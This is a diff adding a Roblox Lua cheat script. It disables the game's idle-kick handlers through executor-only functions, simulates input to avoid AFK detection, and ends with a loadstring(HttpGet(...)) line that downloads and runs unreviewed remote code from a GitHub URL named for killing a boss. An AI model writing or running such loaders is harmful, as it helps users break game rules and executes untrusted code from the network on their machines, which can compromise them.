@@ -1,0 +1,17 @@
+local localPlayer = game:GetService("Players").LocalPlayer
+local VirtualUser = game:GetService("VirtualUser")
+
+pcall(function() 
+    if getconnections then 
+        for _, v in pairs(getconnections(localPlayer.Idled)) do 
+            if v.Disable then v:Disable() elseif v.Disconnect then v:Disconnect() end 
+        end 
+    end 
+end)
+
+localPlayer.Idled:Connect(function() 
+    VirtualUser:CaptureController()
+    VirtualUser:ClickButton2(Vector2.new()) 
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KingSoloooNeverDie/ScriptOverPower/refs/heads/main/KillBoss-ZorVex"))()
